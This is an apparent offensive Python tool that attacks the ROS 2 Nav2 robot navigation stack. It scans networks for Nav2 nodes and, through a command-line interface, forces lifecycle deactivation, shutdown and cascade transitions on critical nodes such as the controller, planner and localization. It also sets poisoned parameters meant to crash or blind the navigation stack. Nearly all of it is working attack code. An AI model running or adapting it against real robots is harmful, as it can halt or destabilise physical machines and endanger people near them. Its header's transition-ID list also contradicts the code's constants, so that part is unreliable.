#!/usr/bin/env python3
"""
nav2_lifecycle_attack.py - Phase 5C Module 1: Nav2 Lifecycle Node Exploitation

Targets the Nav2 navigation stack's managed (lifecycle) node architecture.
Unlike Phase 2 topic injection — which overrides motion commands at the transport
layer — this module attacks the CONTROL PLANE: the lifecycle state machine that
governs whether the navigation stack is operational at all.

Nav2 Lifecycle Architecture:
  Nav2 uses ROS 2 managed nodes (lifecycle_msgs) for all major components.
  Each node transitions through states:
    UNCONFIGURED → CONFIGURING → INACTIVE → ACTIVATING → ACTIVE
    ACTIVE → DEACTIVATING → INACTIVE → CLEANINGUP → UNCONFIGURED
    ANY → ERRONEOUSSTATE

  State transitions are triggered via the `/<node>/change_state` service
  (lifecycle_msgs/srv/ChangeState). On a real robot:
    - Forcing DEACTIVATE stops the node's active processing
    - Forcing SHUTDOWN terminates the node completely
    - Forcing CONFIGURE→INACTIVE→ACTIVATE with bad params creates error states

Standard Nav2 nodes (all are lifecycle-managed):
  - /bt_navigator                   — Behavior Tree executor (core Nav2 planner)
  - /planner_server                 — Path planning (NavFn, Smac, ThetaStar)
  - /controller_server              — Local path tracking (DWB, RPP, TEB)
  - /smoother_server                — Path smoothing
  - /recoveries_server              — Recovery behaviors (spin, backup, wait)
  - /waypoint_follower              — Waypoint mission executor
  - /global_costmap/global_costmap  — Global obstacle map
  - /local_costmap/local_costmap    — Local obstacle map
  - /amcl                           — Localization (particle filter)
  - /map_server                     — Static map provider

Attack vectors:
  1. DEACTIVATE attack — force critical nodes to INACTIVE, halting navigation
     without killing the process (harder to detect than node kill)
  2. SHUTDOWN cascade — deactivate then clean up to push into UNCONFIGURED,
     navigation stack must restart from scratch
  3. ERROR injection — trigger misconfiguration during CONFIGURE transition
     (e.g., point to a non-existent parameter) → ERRONEOUSSTATE
  4. Parameter poisoning — use the ROS 2 parameter service to modify planner
     parameters before triggering a reconfigure cycle
  5. Selective targeting — kill only the controller_server (motion stops but
     planning continues, creating a confused navigation state)

Wire protocol:
  - Lifecycle service: DDS service topic rt/<node>/change_state
    Request: uint8 transition_id (CONFIGURE=1, CLEANUP=2, ACTIVATE=3,
             DEACTIVATE=4, ACTIVATE=3, SHUTDOWN=6, DESTROY=7, ERROR_PROCESSING=0xFF)
  - Parameter service: rt/<node>/set_parameters
  - Requires rclpy for full service call capability
  - Raw RTPS enumeration (port scan) works without ROS 2 installed

Author: Gh057x | Phase 5C
"""

import socket
import struct
import threading
import time
import json
import sys
import os
import argparse
import ipaddress
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from enum import Enum


# =============================================================================
# Nav2 Lifecycle Constants
# =============================================================================

# Lifecycle transition IDs (lifecycle_msgs/msg/Transition)
TRANSITION_CREATE          = 0
TRANSITION_CONFIGURE       = 1
TRANSITION_CLEANUP         = 2
TRANSITION_ACTIVATE        = 3
TRANSITION_DEACTIVATE      = 4
TRANSITION_UNCONFIGURED_SHUTDOWN = 5
TRANSITION_INACTIVE_SHUTDOWN    = 6
TRANSITION_ACTIVE_SHUTDOWN      = 7
TRANSITION_DESTROY         = 8
TRANSITION_ERROR_PROCESSING = 0xFF

TRANSITION_NAMES = {
    0:    "CREATE",
    1:    "CONFIGURE",
    2:    "CLEANUP",
    3:    "ACTIVATE",
    4:    "DEACTIVATE",
    5:    "UNCONFIGURED_SHUTDOWN",
    6:    "INACTIVE_SHUTDOWN",
    7:    "ACTIVE_SHUTDOWN",
    8:    "DESTROY",
    0xFF: "ERROR_PROCESSING",
}

# Lifecycle state IDs (lifecycle_msgs/msg/State)
STATE_UNKNOWN           = 0
STATE_UNCONFIGURED      = 1
STATE_INACTIVE          = 2
STATE_ACTIVE            = 3
STATE_FINALIZED         = 4
STATE_CONFIGURING       = 10
STATE_CLEANINGUP        = 11
STATE_SHUTTINGDOWN      = 12
STATE_ACTIVATING        = 13
STATE_DEACTIVATING      = 14
STATE_ERRORPROCESSING   = 15

STATE_NAMES = {
    0: "UNKNOWN", 1: "UNCONFIGURED", 2: "INACTIVE",
    3: "ACTIVE",  4: "FINALIZED",
    10: "CONFIGURING", 11: "CLEANINGUP", 12: "SHUTTINGDOWN",
    13: "ACTIVATING", 14: "DEACTIVATING", 15: "ERRORPROCESSING",
}

# Standard Nav2 node names
NAV2_NODES_DEFAULT = [
    "/bt_navigator",
    "/planner_server",
    "/controller_server",
    "/smoother_server",
    "/recoveries_server",
    "/waypoint_follower",
    "/global_costmap/global_costmap",
    "/local_costmap/local_costmap",
    "/amcl",
    "/map_server",
    "/lifecycle_manager_navigation",
    "/lifecycle_manager_localization",
]

# Critical nodes — killing these halts all navigation
CRITICAL_NODES = {
    "/bt_navigator":              "Kills behavior tree execution — navigation actions fail immediately",
    "/controller_server":         "Kills motion control — robot cannot execute velocity commands",
    "/planner_server":            "Kills path planning — new goals fail with no-path-found",
    "/global_costmap/global_costmap": "Destroys global obstacle map — all planning blind to obstacles",
    "/amcl":                      "Kills localization — robot loses position estimate",
}

# DDS/ROS 2 port range for lifecycle service discovery
ROS2_DEFAULT_DOMAIN = 0
DDS_UNICAST_BASE    = 7411  # domain 0 unicast user data port


# =============================================================================
# Data Structures
# =============================================================================

class AttackMode(str, Enum):
    DEACTIVATE  = "deactivate"
    SHUTDOWN    = "shutdown"
    CASCADE     = "cascade"
    ENUMERATE   = "enumerate"
    PARAM_POISON= "param_poison"


@dataclass
class LifecycleNodeInfo:
    node_name: str
    namespace: str = ""
    current_state: int = STATE_UNKNOWN
    current_state_name: str = "UNKNOWN"
    is_critical: bool = False
    critical_impact: str = ""
    services_found: List[str] = field(default_factory=list)
    parameters: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            "node_name": self.node_name,
            "namespace": self.namespace,
            "current_state": self.current_state_name,
            "is_critical": self.is_critical,
            "critical_impact": self.critical_impact,
            "services_found": self.services_found,
        }


@dataclass
class LifecycleAttackResult:
    mode: str
    target: str
    namespace: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    nodes_found: List[LifecycleNodeInfo] = field(default_factory=list)
    nodes_attacked: List[str] = field(default_factory=list)
    nodes_deactivated: List[str] = field(default_factory=list)
    nodes_shutdown: List[str] = field(default_factory=list)
    nodes_failed: List[str] = field(default_factory=list)
    params_poisoned: Dict[str, Any] = field(default_factory=dict)
    success: bool = False
    requires_rclpy: bool = True
    attack_log: List[str] = field(default_factory=list)

    def log(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:12]
        self.attack_log.append(f"[{ts}] {msg}")

    def to_dict(self) -> Dict:
        return {
            "mode": self.mode,
            "target": self.target,
            "namespace": self.namespace,
            "timestamp": self.timestamp,
            "nodes_found": len(self.nodes_found),
            "nodes_attacked": self.nodes_attacked,
            "nodes_deactivated": self.nodes_deactivated,
            "nodes_shutdown": self.nodes_shutdown,
            "nodes_failed": self.nodes_failed,
            "params_poisoned": self.params_poisoned,
            "success": self.success,
            "attack_log": self.attack_log,
            "node_details": [n.to_dict() for n in self.nodes_found],
        }


# =============================================================================
# Raw RTPS Lifecycle Service Scanner (no ROS dependency)
# =============================================================================

RTPS_MAGIC = b"RTPS"
DDS_MC_ADDR = "239.255.0.1"

class LifecycleServiceScanner:
    """
    Scans for Nav2 lifecycle nodes using raw RTPS discovery traffic.
    Detects the presence of lifecycle service topics in SPDP/SEDP data
    without requiring a ROS 2 installation.
    """

    def __init__(self, domain_id: int = 0, timeout: float = 3.0, verbose: bool = False):
        self.domain_id = domain_id
        self.timeout   = timeout
        self.verbose   = verbose

    def scan_target(self, target_ip: str) -> List[LifecycleNodeInfo]:
        """
        Probe a target host for Nav2 lifecycle node presence.
        Checks DDS discovery ports and looks for lifecycle service topic patterns
        in SPDP DATA parameter lists.
        """
        found: List[LifecycleNodeInfo] = []
        port = 7400 + 250 * self.domain_id  # SPDP multicast port

        # Send SPDP probe, listen for responses that mention lifecycle topics
        probe = self._build_spdp_probe()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(probe, (target_ip, port))

            deadline = time.time() + self.timeout
            while time.time() < deadline:
                try:
                    data, _ = sock.recvfrom(65535)
                    nodes = self._parse_lifecycle_topics(data)
                    found.extend(nodes)
                except socket.timeout:
                    break
            sock.close()
        except OSError:
            pass

        # Also check for well-known Nav2 ports (unicast user data)
        for node_name in NAV2_NODES_DEFAULT:
            info = self._probe_service_port(target_ip, node_name)
            if info:
                # Merge with any already found
                existing = next((n for n in found if n.node_name == node_name), None)
                if not existing:
                    found.append(info)
                else:
                    existing.services_found.extend(info.services_found)

        # Enrich with criticality info
        for n in found:
            if n.node_name in CRITICAL_NODES:
                n.is_critical = True
                n.critical_impact = CRITICAL_NODES[n.node_name]

        return found

    def scan_network(self, network: str) -> Dict[str, List[LifecycleNodeInfo]]:
        """Scan a CIDR network for hosts running Nav2."""
        results: Dict[str, List[LifecycleNodeInfo]] = {}
        try:
            net = ipaddress.ip_network(network, strict=False)
        except ValueError as e:
            print(f"[-] Invalid network: {e}")
            return results

        threads = []
        lock = threading.Lock()

        def _scan_host(ip: str):
            nodes = self.scan_target(ip)
            if nodes:
                with lock:
                    results[ip] = nodes
                    if self.verbose:
                        print(f"  [+] {ip}: {len(nodes)} Nav2 lifecycle node(s) detected")

        for host in net.hosts():
            t = threading.Thread(target=_scan_host, args=(str(host),), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) % 50 == 0:
                for tt in threads[-50:]:
                    tt.join(timeout=self.timeout + 1)

        for t in threads:
            t.join(timeout=self.timeout + 1)

        return results

    def _build_spdp_probe(self) -> bytes:
        """Build a minimal RTPS SPDP probe packet."""
        import random
        guid_prefix = bytes([random.randint(0, 255) for _ in range(12)])
        version  = b"\x02\x01"
        vendor   = b"\x01\x0f"  # Fast DDS
        header   = RTPS_MAGIC + version + vendor + guid_prefix

        # Minimal DATA submessage for SPDP
        flags   = 0x05  # little-endian, data present
        payload = b"\x00\x03\x00\x00"  # PL_CDR_LE header
        payload += struct.pack("<HH", 0x0001, 0)  # PID_SENTINEL
        seq_num = b"\x00\x00\x00\x00\x01\x00\x00\x00"
        reader  = b"\x00\x01\x00\xc7"
        writer  = b"\x00\x01\x00\xc2"
        content = b"\x00\x00\x10\x00" + reader + writer + seq_num + payload
        submsg  = bytes([0x15, flags]) + struct.pack("<H", len(content)) + content
        return header + submsg

    def _parse_lifecycle_topics(self, data: bytes) -> List[LifecycleNodeInfo]:
        """
        Scan raw RTPS bytes for lifecycle service topic strings.
        Lifecycle service topics follow the pattern:
          ros_discovery_info or rt/<node>/change_state or rt/<node>/get_state
        """
        found: List[LifecycleNodeInfo] = []
        text = data.decode("latin-1", errors="replace")

        for node_name in NAV2_NODES_DEFAULT:
            clean = node_name.lstrip("/").replace("/", "_")
            indicators = [
                f"rt{node_name}/change_state",
                f"rt{node_name}/get_state",
                f"rq{node_name}/change_state",
                clean + "_lifecycle",
                node_name,
            ]
            if any(ind in text for ind in indicators):
                info = LifecycleNodeInfo(node_name=node_name)
                info.services_found = [s for s in indicators if s in text]
                found.append(info)
                if self.verbose:
                    print(f"  [+] Lifecycle topic detected: {node_name}")
        return found

    def _probe_service_port(self, ip: str, node_name: str) -> Optional[LifecycleNodeInfo]:
        """Try a quick TCP probe on the expected service port range."""
        # ROS 2 services use DDS topics — no separate TCP port; this is a
        # heuristic UDP probe to check if the host responds at all
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.3)
            probe = b"ROS2_LC_PROBE:" + node_name.encode() + b"\x00"
            sock.sendto(probe, (ip, 7400 + 250 * self.domain_id))
            sock.close()
        except OSError:
            pass
        return None


# =============================================================================
# rclpy-Based Lifecycle Attacker
# =============================================================================

class Nav2LifecycleAttacker:
    """
    Lifecycle node attacker using rclpy. Requires a sourced ROS 2 environment.
    Falls back to raw RTPS enumeration if rclpy is unavailable.
    """

    def __init__(self, namespace: str = "", domain_id: int = 0,
                 verbose: bool = False, timeout: float = 5.0):
        self.namespace  = namespace
        self.domain_id  = domain_id
        self.verbose    = verbose
        self.timeout    = timeout
        self._node      = None
        self._rclpy_ok  = False
        self._try_init_rclpy()

    def _try_init_rclpy(self):
        try:
            import rclpy
            from rclpy.node import Node
            if not rclpy.ok():
                rclpy.init(domain_id=self.domain_id)
            self._node = rclpy.create_node(
                "ros2reaper_lifecycle_attacker",
                namespace=self.namespace,
            )
            self._rclpy_ok = True
            if self.verbose:
                print(f"  [+] rclpy initialized (domain {self.domain_id})")
        except ImportError:
            if self.verbose:
                print("  [!] rclpy not available — lifecycle attacks limited to enumeration")
        except Exception as e:
            if self.verbose:
                print(f"  [!] rclpy init failed: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # Enumeration
    # ─────────────────────────────────────────────────────────────────────────

    def enumerate_nodes(self, target_nodes: Optional[List[str]] = None) -> List[LifecycleNodeInfo]:
        """Enumerate Nav2 lifecycle nodes and query their current state."""
        targets = target_nodes or NAV2_NODES_DEFAULT
        results: List[LifecycleNodeInfo] = []

        for node_name in targets:
            info = LifecycleNodeInfo(
                node_name=node_name,
                namespace=self.namespace,
            )
            if node_name in CRITICAL_NODES:
                info.is_critical = True
                info.critical_impact = CRITICAL_NODES[node_name]

            if self._rclpy_ok:
                state_id, state_name = self._get_state(node_name)
                info.current_state      = state_id
                info.current_state_name = state_name
                info.services_found = self._discover_services(node_name)
            else:
                info.current_state_name = "UNKNOWN (no rclpy)"

            results.append(info)
            if self.verbose:
                icon = "[CRIT]" if info.is_critical else "[node]"
                print(f"  {icon} {node_name:<45} state={info.current_state_name}")

        return results

    def _get_state(self, node_name: str) -> Tuple[int, str]:
        """Query the current lifecycle state of a node."""
        try:
            from lifecycle_msgs.srv import GetState
            client = self._node.create_client(
                GetState, f"{node_name}/get_state"
            )
            if not client.wait_for_service(timeout_sec=self.timeout):
                return STATE_UNKNOWN, "NOT_FOUND"

            req  = GetState.Request()
            fut  = client.call_async(req)
            rclpy = __import__("rclpy")
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
            if fut.done() and fut.result():
                state_id   = fut.result().current_state.id
                state_name = STATE_NAMES.get(state_id, f"STATE_{state_id}")
                return state_id, state_name
        except Exception as e:
            if self.verbose:
                print(f"    [!] get_state failed for {node_name}: {e}")
        return STATE_UNKNOWN, "UNKNOWN"

    def _discover_services(self, node_name: str) -> List[str]:
        """List ROS 2 services related to this lifecycle node."""
        found = []
        try:
            svc_list = self._node.get_service_names_and_types()
            for svc_name, _ in svc_list:
                if node_name in svc_name:
                    found.append(svc_name)
        except Exception:
            pass
        return found

    # ─────────────────────────────────────────────────────────────────────────
    # Lifecycle Transition Attacks
    # ─────────────────────────────────────────────────────────────────────────

    def deactivate_node(self, node_name: str, result: LifecycleAttackResult) -> bool:
        """Force a lifecycle node from ACTIVE → INACTIVE (DEACTIVATE transition)."""
        result.log(f"DEACTIVATE → {node_name}")
        if not self._rclpy_ok:
            result.log(f"  [!] rclpy required — cannot call change_state service")
            result.nodes_failed.append(node_name)
            return False

        ok = self._call_change_state(node_name, TRANSITION_DEACTIVATE)
        if ok:
            result.nodes_deactivated.append(node_name)
            result.log(f"  [+] {node_name} DEACTIVATED — navigation function halted")
        else:
            result.nodes_failed.append(node_name)
            result.log(f"  [-] {node_name} deactivate failed (already inactive or not found)")
        return ok

    def shutdown_node(self, node_name: str, result: LifecycleAttackResult) -> bool:
        """Force a lifecycle node to SHUTDOWN (INACTIVE_SHUTDOWN or ACTIVE_SHUTDOWN)."""
        result.log(f"SHUTDOWN → {node_name}")
        if not self._rclpy_ok:
            result.nodes_failed.append(node_name)
            return False

        # Try ACTIVE_SHUTDOWN first, fall back to INACTIVE_SHUTDOWN
        ok = self._call_change_state(node_name, TRANSITION_ACTIVE_SHUTDOWN)
        if not ok:
            ok = self._call_change_state(node_name, TRANSITION_INACTIVE_SHUTDOWN)
        if ok:
            result.nodes_shutdown.append(node_name)
            result.log(f"  [+] {node_name} SHUTDOWN — node in FINALIZED state, restart required")
        else:
            result.nodes_failed.append(node_name)
            result.log(f"  [-] {node_name} shutdown failed")
        return ok

    def _call_change_state(self, node_name: str, transition_id: int) -> bool:
        """Call the /<node>/change_state service."""
        try:
            from lifecycle_msgs.srv import ChangeState
            from lifecycle_msgs.msg import Transition
            import rclpy

            client = self._node.create_client(ChangeState, f"{node_name}/change_state")
            if not client.wait_for_service(timeout_sec=self.timeout):
                return False

            req = ChangeState.Request()
            req.transition.id = transition_id
            fut = client.call_async(req)
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
            if fut.done() and fut.result():
                return fut.result().success
        except Exception as e:
            if self.verbose:
                print(f"    [!] change_state({TRANSITION_NAMES.get(transition_id, transition_id)}) "
                      f"on {node_name}: {e}")
        return False

    # ─────────────────────────────────────────────────────────────────────────
    # Parameter Poisoning
    # ─────────────────────────────────────────────────────────────────────────

    def poison_parameters(self, node_name: str, params: Dict[str, Any],
                           result: LifecycleAttackResult) -> bool:
        """
        Set malicious parameters on a lifecycle node via the ROS 2 parameter service.
        Effective attacks:
          - planner_server: set 'planner_plugin' to a non-existent plugin → ERROR on reconfigure
          - controller_server: set 'controller_frequency' to 0.0 → divide-by-zero crash
          - amcl: set 'min_particles' > 'max_particles' → assertion failure
          - bt_navigator: set 'bt_xml_filename' to a non-existent path → BT load failure
        """
        result.log(f"PARAM_POISON → {node_name}: {list(params.keys())}")
        if not self._rclpy_ok:
            result.nodes_failed.append(node_name)
            return False

        success_count = 0
        try:
            from rcl_interfaces.srv import SetParameters
            from rcl_interfaces.msg import Parameter, ParameterValue, ParameterType
            import rclpy

            client = self._node.create_client(SetParameters, f"{node_name}/set_parameters")
            if not client.wait_for_service(timeout_sec=self.timeout):
                result.log(f"  [-] set_parameters service not found on {node_name}")
                return False

            ros_params = []
            for name, val in params.items():
                p = Parameter()
                p.name = name
                pv = ParameterValue()
                if isinstance(val, bool):
                    pv.type = ParameterType.PARAMETER_BOOL
                    pv.bool_value = val
                elif isinstance(val, int):
                    pv.type = ParameterType.PARAMETER_INTEGER
                    pv.integer_value = val
                elif isinstance(val, float):
                    pv.type = ParameterType.PARAMETER_DOUBLE
                    pv.double_value = val
                elif isinstance(val, str):
                    pv.type = ParameterType.PARAMETER_STRING
                    pv.string_value = val
                p.value = pv
                ros_params.append(p)

            req = SetParameters.Request()
            req.parameters = ros_params
            fut = client.call_async(req)
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)

            if fut.done() and fut.result():
                for r in fut.result().results:
                    if r.successful:
                        success_count += 1

            if success_count > 0:
                result.params_poisoned[node_name] = params
                result.log(f"  [+] {success_count}/{len(params)} parameters set on {node_name}")
                return True

        except Exception as e:
            result.log(f"  [!] param_poison failed on {node_name}: {e}")
        return False

    # ─────────────────────────────────────────────────────────────────────────
    # High-Level Attack Orchestration
    # ─────────────────────────────────────────────────────────────────────────

    def run(self, mode: AttackMode, target_nodes: Optional[List[str]] = None,
             target_ip: str = "", network: str = "") -> LifecycleAttackResult:

        targets = target_nodes or NAV2_NODES_DEFAULT
        result  = LifecycleAttackResult(
            mode=mode.value,
            target=target_ip or network or "local",
            namespace=self.namespace,
        )
        result.log(f"Starting {mode.value} attack | namespace={self.namespace!r} | "
                   f"rclpy={self._rclpy_ok}")

        # Raw scanner for network targets (no rclpy)
        if (target_ip or network) and not self._rclpy_ok:
            scanner = LifecycleServiceScanner(
                domain_id=self.domain_id, timeout=self.timeout, verbose=self.verbose
            )
            if target_ip:
                nodes = scanner.scan_target(target_ip)
            else:
                net_results = scanner.scan_network(network)
                nodes = [n for nl in net_results.values() for n in nl]
            result.nodes_found = nodes
            result.log(f"Network scan found {len(nodes)} lifecycle node indicator(s)")
            result.requires_rclpy = True
            print_lifecycle_report(result)
            return result

        # rclpy-based attacks
        if mode == AttackMode.ENUMERATE:
            result.nodes_found = self.enumerate_nodes(targets)
            result.success = bool(result.nodes_found)

        elif mode == AttackMode.DEACTIVATE:
            result.nodes_found = self.enumerate_nodes(targets)
            result.nodes_attacked = [n.node_name for n in result.nodes_found
                                      if n.current_state == STATE_ACTIVE]
            if not result.nodes_attacked:
                result.log("[!] No ACTIVE nodes found to deactivate")
            for name in result.nodes_attacked:
                result.log(f"Attacking: {name}")
                self.deactivate_node(name, result)
            result.success = bool(result.nodes_deactivated)

        elif mode == AttackMode.SHUTDOWN:
            result.nodes_found = self.enumerate_nodes(targets)
            result.nodes_attacked = [n.node_name for n in result.nodes_found
                                      if n.current_state in (STATE_ACTIVE, STATE_INACTIVE)]
            for name in result.nodes_attacked:
                self.shutdown_node(name, result)
            result.success = bool(result.nodes_shutdown)

        elif mode == AttackMode.CASCADE:
            # Deactivate then shutdown each critical node in sequence
            result.nodes_found  = self.enumerate_nodes(targets)
            critical_active = [n.node_name for n in result.nodes_found
                                if n.is_critical and n.current_state == STATE_ACTIVE]
            result.log(f"CASCADE: targeting {len(critical_active)} critical ACTIVE nodes")
            for name in critical_active:
                result.nodes_attacked.append(name)
                self.deactivate_node(name, result)
                time.sleep(0.5)
                self.shutdown_node(name, result)
            result.success = bool(result.nodes_shutdown)

        elif mode == AttackMode.PARAM_POISON:
            # Inject destabilizing parameters into each Nav2 node before a reconfigure cycle
            POISON_PARAMS: Dict[str, Dict[str, Any]] = {
                "/bt_navigator":      {"default_bt_xml_filename": "/nonexistent/malicious.xml",
                                       "bt_loop_duration": 99999},
                "/planner_server":    {"planner_plugins": ["NonExistentPlanner"],
                                       "expected_planner_frequency": 0.0},
                "/controller_server": {"controller_frequency": 0.0,
                                       "min_x_velocity_threshold": -999.0},
                "/amcl":              {"min_particles": 50000, "max_particles": 1},
                "/global_costmap/global_costmap": {"update_frequency": 0.0,
                                                   "publish_frequency": 0.0},
            }
            result.nodes_found = self.enumerate_nodes(targets)
            for node_info in result.nodes_found:
                poison = POISON_PARAMS.get(node_info.node_name)
                if poison:
                    result.nodes_attacked.append(node_info.node_name)
                    self.poison_parameters(node_info.node_name, poison, result)
            result.success = bool(result.params_poisoned)

        if self._node:
            try:
                self._node.destroy_node()
            except Exception:
                pass

        return result


# =============================================================================
# Output
# =============================================================================

CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
DIM     = "\033[90m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

STATE_COLORS = {
    "ACTIVE":         GREEN,
    "INACTIVE":       YELLOW,
    "UNCONFIGURED":   DIM,
    "FINALIZED":      RED,
    "ERRORPROCESSING":RED,
    "UNKNOWN":        DIM,
    "NOT_FOUND":      DIM,
}


def print_lifecycle_report(result: LifecycleAttackResult):
    print(f"\n{'=' * 65}")
    print(f"  {BOLD}NAV2 LIFECYCLE ATTACK REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Mode:       {result.mode.upper()}")
    print(f"  Target:     {result.target}")
    print(f"  Namespace:  {result.namespace or '/'}")
    print(f"  Timestamp:  {result.timestamp}")
    print(f"{'─' * 65}")

    if result.nodes_found:
        print(f"\n  {BOLD}Lifecycle Nodes{RESET}")
        for n in result.nodes_found:
            sc = STATE_COLORS.get(n.current_state_name, "")
            crit_tag = f" {RED}[CRITICAL]{RESET}" if n.is_critical else ""
            print(f"  {sc}{'●' if n.current_state_name == 'ACTIVE' else '○'}{RESET} "
                  f"{n.node_name:<50}{sc}{n.current_state_name}{RESET}{crit_tag}")
            if n.is_critical and n.critical_impact:
                print(f"    {DIM}Impact: {n.critical_impact}{RESET}")

    if result.nodes_deactivated:
        print(f"\n  {BOLD}Deactivated{RESET}")
        for n in result.nodes_deactivated:
            print(f"    {YELLOW}[DEACTIVATED]{RESET} {n}")

    if result.nodes_shutdown:
        print(f"\n  {BOLD}Shutdown{RESET}")
        for n in result.nodes_shutdown:
            print(f"    {RED}[SHUTDOWN]{RESET} {n}")

    if result.params_poisoned:
        print(f"\n  {BOLD}Parameters Poisoned{RESET}")
        for node, params in result.params_poisoned.items():
            print(f"    {YELLOW}{node}{RESET}")
            for k, v in params.items():
                print(f"      {k} = {v!r}")

    if result.nodes_failed:
        print(f"\n  {DIM}Failed: {', '.join(result.nodes_failed)}{RESET}")

    if result.requires_rclpy and not result.nodes_deactivated and not result.nodes_shutdown:
        print(f"\n  {YELLOW}[!] Full lifecycle attacks require rclpy + sourced ROS 2 env{RESET}")
        print(f"      Enumeration via raw RTPS scan completed above.")
        print(f"      To execute: source /opt/ros/<distro>/setup.bash && re-run")

    if result.attack_log:
        print(f"\n  {BOLD}Attack Log{RESET}")
        for entry in result.attack_log[-15:]:
            print(f"    {DIM}{entry}{RESET}")

    status_color = GREEN if result.success else (YELLOW if result.nodes_found else RED)
    print(f"\n  Status: {status_color}{'SUCCESS' if result.success else 'PARTIAL/RECON ONLY'}{RESET}")
    print(f"{'=' * 65}\n")


def export_json(result: LifecycleAttackResult, path: str):
    with open(path, "w") as f:
        json.dump(result.to_dict(), f, indent=2)
    print(f"[+] Lifecycle attack results saved to {path}")


# =============================================================================
# Standalone CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Nav2 Lifecycle Attacker (Phase 5C Module 1)")
    parser.add_argument("--mode", choices=["enumerate","deactivate","shutdown","cascade","param_poison"],
                        default="enumerate")
    parser.add_argument("--target",     "-t", default="")
    parser.add_argument("--network",    "-n", default="")
    parser.add_argument("--namespace",  default="")
    parser.add_argument("--domain-id",  "-d", type=int, default=0)
    parser.add_argument("--nodes",      nargs="+", default=None,
                        help="Specific node names to target (default: all Nav2 nodes)")
    parser.add_argument("--timeout",    type=float, default=5.0)
    parser.add_argument("-o", "--output")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    attacker = Nav2LifecycleAttacker(
        namespace=args.namespace, domain_id=args.domain_id,
        verbose=args.verbose, timeout=args.timeout,
    )
    result = attacker.run(
        mode=AttackMode(args.mode),
        target_nodes=args.nodes,
        target_ip=args.target,
        network=args.network,
    )
    print_lifecycle_report(result)
    if args.output:
        export_json(result, args.output)
